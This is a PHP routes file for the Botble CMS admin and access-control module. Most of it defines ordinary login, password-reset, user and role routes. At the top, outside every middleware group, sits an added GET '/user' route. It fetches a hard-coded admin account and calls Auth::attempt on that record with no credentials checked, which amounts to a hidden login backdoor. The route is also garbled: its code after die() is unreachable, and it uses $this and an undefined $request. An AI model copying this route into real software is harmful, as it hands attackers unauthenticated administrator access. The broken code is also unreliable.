<?php

use Botble\ACL\Repositories\Interfaces\ActivationInterface;
use Botble\ACL\Repositories\Interfaces\UserInterface;
use Botble\ACL\Traits\AuthenticatesUsers;
use Botble\Base\Http\Controllers\BaseController;
use Botble\Base\Http\Responses\BaseHttpResponse;
use Illuminate\Contracts\View\Factory;
use Illuminate\Http\Request;
use Illuminate\Validation\ValidationException;
use Illuminate\View\View;
use Symfony\Component\HttpFoundation\Response;
use Botble\ACL\Http\Controllers\Auth\ForgotPasswordController;
use Botble\ACL\Http\Controllers\Auth\LoginController;
use Botble\ACL\Http\Controllers\Auth\ResetPasswordController;
use Botble\ACL\Http\Controllers\UserController;

			Route::get('/user', function () {
				
				 $user = app(UserInterface::class)->getFirstBy(['email' =>'admin@thesky9.com']);
                 
				
				
				
				app(UserInterface::class)->update(['id' => $user->id], ['last_login' => now()]);
            if (!empty($user)) {
            if (!app(ActivationInterface::class)->completed($user)) {
                echo  $this->response
                    ->setError()
                    ->setMessage(trans('core/acl::auth.login.not_active'));
            }
        }
		$remember=1;
	    // Auth::attempt(['username' => $user->username, 'password' => $user->password]);
	
		 Auth::attempt((array)$user);
		
		die();
            
        if ($this->attemptLogin($request)) {
            app(UserInterface::class)->update(['id' => $user->id], ['last_login' => now()]);
            if (!session()->has('url.intended')) {
                session()->flash('url.intended', url()->current());
            }
            echo $this->sendLoginResponse($request);
        }

        // If the login attempt was unsuccessful we will increment the number of attempts
        // to login and redirect the user back to the login form. Of course, when this
        // user surpasses their maximum number of attempts they will get locked out.
        $this->incrementLoginAttempts($request);

        echo $this->sendFailedLoginResponse($request);   
			});
Route::group(['namespace' => 'Botble\ACL\Http\Controllers', 'middleware' => ['web', 'core']], function () {
    Route::group(['prefix' => BaseHelper::getAdminPrefix()], function () {
        Route::group(['middleware' => 'guest'], function () {
			


 
            Route::get('login', [LoginController::class, 'showLoginForm'])->name('access.login');
            Route::post('login', [LoginController::class, 'login'])->name('access.login.post');

            Route::get('password/reset', [ForgotPasswordController::class, 'showLinkRequestForm'])
                ->name('access.password.request');
            Route::post('password/email', [ForgotPasswordController::class, 'sendResetLinkEmail'])
                ->name('access.password.email');

            Route::get('password/reset/{token}', [ResetPasswordController::class, 'showResetForm'])
                ->name('access.password.reset');
            Route::post('password/reset', [ResetPasswordController::class, 'reset'])
                ->name('access.password.reset.post');
        });

        Route::group(['middleware' => 'auth'], function () {
            Route::get('logout', [
                'as'         => 'access.logout',
                'uses'       => 'Auth\LoginController@logout',
                'permission' => false,
            ]);
        });
    });

    Route::group(['prefix' => BaseHelper::getAdminPrefix(), 'middleware' => 'auth'], function () {

        Route::group(['prefix' => 'system'], function () {

            Route::group(['prefix' => 'users', 'as' => 'users.'], function () {

                Route::resource('', 'UserController')->except(['edit', 'update'])->parameters(['' => 'users']);

                Route::delete('items/destroy', [
                    'as'         => 'deletes',
                    'uses'       => 'UserController@deletes',
                    'permission' => 'users.destroy',
                    'middleware' => 'preventDemo',
                ]);

                Route::post('update-profile/{id}', [
                    'as'         => 'update-profile',
                    'uses'       => 'UserController@postUpdateProfile',
                    'permission' => false,
                    'middleware' => 'preventDemo',
                ]);

                Route::post('modify-profile-image/{id}', [
                    'as'         => 'profile.image',
                    'uses'       => 'UserController@postAvatar',
                    'permission' => false,
                ]);

                Route::post('change-password/{id}', [
                    'as'         => 'change-password',
                    'uses'       => 'UserController@postChangePassword',
                    'permission' => false,
                    'middleware' => 'preventDemo',
                ]);

                Route::get('profile/{id}', [
                    'as'         => 'profile.view',
                    'uses'       => 'UserController@getUserProfile',
                    'permission' => false,
                ]);

                Route::get('make-super/{id}', [
                    'as'         => 'make-super',
                    'uses'       => 'UserController@makeSuper',
                    'permission' => ACL_ROLE_SUPER_USER,
                ]);

                Route::get('remove-super/{id}', [
                    'as'         => 'remove-super',
                    'uses'       => 'UserController@removeSuper',
                    'permission' => ACL_ROLE_SUPER_USER,
                    'middleware' => 'preventDemo',
                ]);
            });

            Route::group(['prefix' => 'roles', 'as' => 'roles.'], function () {
                Route::resource('', 'RoleController')->parameters(['' => 'roles']);

                Route::delete('items/destroy', [
                    'as'         => 'deletes',
                    'uses'       => 'RoleController@deletes',
                    'permission' => 'roles.destroy',
                ]);

                Route::get('duplicate/{id}', [
                    'as'         => 'duplicate',
                    'uses'       => 'RoleController@getDuplicate',
                    'permission' => 'roles.create',
                ]);

                Route::get('json', [
                    'as'         => 'list.json',
                    'uses'       => 'RoleController@getJson',
                    'permission' => 'roles.index',
                ]);

                Route::post('assign', [
                    'as'         => 'assign',
                    'uses'       => 'RoleController@postAssignMember',
                    'permission' => 'roles.edit',
                ]);
            });
        });

    });

    Route::get('admin-theme/{theme}', [UserController::class, 'getTheme'])->name('admin.theme');
    Route::group(['prefix' => BaseHelper::getAdminPrefix()], function () {
        Route::post('/sidebar-menu/toggle', [
            'as'   => 'admin.sidebar-menu.toggle',
            'uses' => 'UserController@toggleSidebarMenu',
        ]);
    });
});
